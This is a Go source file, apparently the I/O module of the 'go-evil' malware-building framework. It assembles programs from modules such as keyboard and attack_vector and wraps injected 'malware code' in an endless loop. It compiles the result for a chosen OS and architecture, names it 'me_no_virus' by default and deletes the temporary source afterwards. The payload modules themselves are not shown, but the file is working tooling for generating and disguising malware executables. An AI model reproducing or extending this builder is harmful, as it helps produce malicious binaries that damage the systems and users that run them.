package io

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"

	mal "github.com/s9rA16Bf4/go-evil/domains/malware"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

var debug bool = false
var domains []string

func Set_debug(new_debug bool) {
	debug = new_debug
}

const (
	sys           = "\tsys \"github.com/s9rA16Bf4/go-evil/domains/system\""
	win           = "\twin \"github.com/s9rA16Bf4/go-evil/domains/window\""
	time          = "\ttime \"github.com/s9rA16Bf4/go-evil/domains/time\""
	keyboard      = "\tkeyboard \"github.com/s9rA16Bf4/go-evil/domains/keyboard\""
	hashing       = "\thash \"github.com/s9rA16Bf4/go-evil/domains/algorithm/hashing\""
	attack_vector = "\tattack \"github.com/s9rA16Bf4/go-evil/domains/attack_vector\""

	// Related to webview
	loader_x86 = "https://github.com/webview/webview/raw/master/dll/x86/WebView2Loader.dll"
	view_x86   = "https://github.com/webview/webview/raw/master/dll/x86/webview.dll"
	loader_x64 = "https://github.com/webview/webview/raw/master/dll/x64/WebView2Loader.dll"
	view_x64   = "https://github.com/webview/webview/raw/master/dll/x64/webview.dll"
)

func Append_domain(domain string) {
	switch domain {
	case "system":
		if !find(sys) {
			notify.Log("Adding domain 'system'", notify.Verbose_lvl, "2")
			domains = append(domains, sys)
		}
	case "window":
		if !find(win) {
			notify.Log("Adding domain 'window'", notify.Verbose_lvl, "2")
			domains = append(domains, win)
		}
	case "time":
		if !find(time) {
			notify.Log("Adding domain 'time'", notify.Verbose_lvl, "2")
			domains = append(domains, time)
		}

	case "keyboard":
		if !find(keyboard) {
			notify.Log("Adding domain 'keyboard'", notify.Verbose_lvl, "2")
			domains = append(domains, keyboard)
		}
	case "hashing":
		if !find(hashing) {
			notify.Log("Adding domain 'hashing'", notify.Verbose_lvl, "2")
			domains = append(domains, hashing)
		}
	case "attack_vector":
		if !find(attack_vector) {
			notify.Log("Adding domain 'attack_vector'", notify.Verbose_lvl, "2")
			domains = append(domains, attack_vector)
		}
	}
}

func Set_target_OS(new_os string) {
	notify.Log("Updating target os, "+new_os, notify.Verbose_lvl, "2")
	os.Setenv("GOOS", new_os)

}
func Set_target_ARCH(new_arch string) {
	notify.Log("Updating target architecture, "+new_arch, notify.Verbose_lvl, "2")
	os.Setenv("GOARCH", new_arch)
}

func find(domain string) bool {
	for _, line := range domains {
		if domain == line {
			return true
		}
	}
	return false
}

func Write_file() {
	base_code := []string{
		"package main",
		"import (",
	}
	base_code = append(base_code, domains...)                  // Which domains to include
	base_code = append(base_code, ")", "func main(){")         // Main function and closing include tag
	base_code = append(base_code, "for {")                     // While loop
	base_code = append(base_code, mal.Malware_getContent()...) // Insert the malware code
	base_code = append(base_code, "}}")                        // And insert the end

	if mal.Malware_getName() == "" {
		mal.Malware_setBinaryName("me_no_virus")
	}

	file, _ := os.Create("output/temp.go") // We utilize a temp directory
	write := bufio.NewWriter(file)

	for _, line := range base_code {
		notify.Log("Writing line '"+line+"' to the target file", notify.Verbose_lvl, "3")
		_, err := write.WriteString(line + "\n")
		if err != nil {
			notify.Error("Failed to write to disk", "io.write_file()")
		}
	}
	write.Flush()
}

func Read_file(file string) string {
	file_gut, err := ioutil.ReadFile(file)
	if err != nil {
		notify.Error(err.Error(), "io.read_file()")
	}
	return string(file_gut)
}

func Compile_file() {
	if runtime.GOOS == "windows" && mal.Malware_getExtension() == "" {
		mal.Malware_setExtension(".exe") // Apparently golang on windows doesn't do this automatically
		notify.Log("Setting .exe extension on the target file", notify.Verbose_lvl, "3")
	}
	arg := "build -o output/" + mal.Malware_getName() + mal.Malware_getExtension() + " output/temp.go"
	cmd := exec.Command("go", strings.Split(arg, " ")...)
	notify.Log("Compiling malware", notify.Verbose_lvl, "1")

	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr

	err := cmd.Run()

	if err != nil {
		notify.Error(fmt.Sprint(err)+": "+stderr.String(), "io.compile_file()")
	}

	if !debug {
		notify.Log("Removing the temoporarly made golang file", notify.Verbose_lvl, "2")
		arg = "output/temp.go"
		cmd = exec.Command("rm", strings.Split(arg, " ")...)
		err := cmd.Run()

		if err != nil {
			notify.Error(fmt.Sprint(err)+": "+stderr.String(), "io.compile_file()")
		}
	}
	create_dll() // Creates only if necessary to the somewhat required dll files (only on windows)
}

func create_dll() {
	if runtime.GOOS == "windows" { // Only required on windows, seems like most posix systems has this already included
		_, err := os.Stat("output/WebView2Loader.dll")
		if err != nil {
			notify.Log("Creating DLL file 'WebView2Loader.dll'", notify.Verbose_lvl, "2")
			create_WebView2Loader()
		}
		_, err = os.Stat("output/webview.dll")
		if err != nil {
			notify.Log("Creating DLL file 'webView.dll'", notify.Verbose_lvl, "2")
			create_webView()
		}
	}
}
func create_webView() {
	target := ""
	if os.Getenv("GOARCH") == "x64" {
		target = view_x64
	} else {
		target = view_x86
	}
	notify.Log("Downloading 'webView.dll'", notify.Verbose_lvl, "3")
	response, err := http.Get(target)
	if err != nil {
		notify.Error(err.Error(), "io.create_webView()")
	}
	out, err := os.Create("output/webView.dll")
	if err != nil {
		notify.Error(err.Error(), "io.create_webView()")
	}

	_, err = io.Copy(out, response.Body)
	if err != nil {
		notify.Error(err.Error(), "io.create_webView()")
	}
}
func create_WebView2Loader() {
	target := ""
	if os.Getenv("GOARCH") == "x64" {
		target = loader_x64
	} else {
		target = loader_x86
	}
	notify.Log("Downloading 'WebView2Loader.dll'", notify.Verbose_lvl, "3")
	response, err := http.Get(target)
	if err != nil {
		notify.Error(err.Error(), "io.create_WebView2Loader()")
	}
	out, err := os.Create("output/WebView2Loader.dll")
	if err != nil {
		notify.Error(err.Error(), "io.create_WebView2Loader()")
	}

	_, err = io.Copy(out, response.Body)
	if err != nil {
		notify.Error(err.Error(), "io.create_WebView2Loader()")
	}
}
